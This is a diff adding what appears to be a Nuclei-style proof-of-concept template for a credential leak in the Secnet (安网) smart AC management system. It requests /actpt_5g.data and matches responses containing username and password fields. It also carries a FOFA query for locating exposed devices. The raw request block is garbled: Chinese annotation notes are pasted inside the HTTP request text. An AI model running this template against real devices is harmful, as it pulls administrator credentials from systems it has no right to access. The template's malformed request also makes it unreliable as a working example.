@@ -1,0 +1,34 @@
+id: poc-fg0xc2k3og9ogrh2
+info:
+  name: Secnet安网 智能AC管理系统 actpt_5g 信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fg0xc2k3og9ogrh2'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fg0xc2k3og9ogrh2
+    fofa: title="安网-智能路由系统" || header="HTTPD_ac 1.0"
+http:
+- raw:
+  - 'GET /actpt_5g.data HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?username)(?=.*?passwd).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
